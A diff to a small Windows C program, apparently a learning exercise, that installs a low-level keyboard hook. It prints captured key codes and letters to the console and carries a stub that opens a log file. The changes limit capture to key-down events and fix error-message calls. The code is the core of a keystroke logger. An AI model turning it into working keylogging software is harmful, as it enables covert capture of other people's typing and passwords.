@@ -6,7 +6,7 @@ static HHOOK handlekeyboard = NULL;
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
-
+	
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	printf("%u\n", kb->vkCode);
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
@@ -17,7 +17,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	LPKBDLLHOOKSTRUCT kb;
 
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
-	if (kb->vkCode >= 65 && kb->vkCode <= 90)
+	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
 		printf("%c\n", (char)kb->vkCode);
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
@@ -42,14 +42,11 @@ void	setwinhook()
 void	save_data()
 {
 	FILE *file;
+
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
-		_wperror(" Open file failed ");
-
+		_wperror(L" Open file failed ");
 	if (fclose(file) != 0)
-		_wperror(" Close file failed ");
-
-
-
+		_wperror(L" Close file failed ");
 }
 
 int	main(void)
@@ -64,6 +61,4 @@ int	main(void)
 	}
 	UnhookWindowsHookEx(handlekeyboard);
 	return (msg.wParam);
-
-
 }
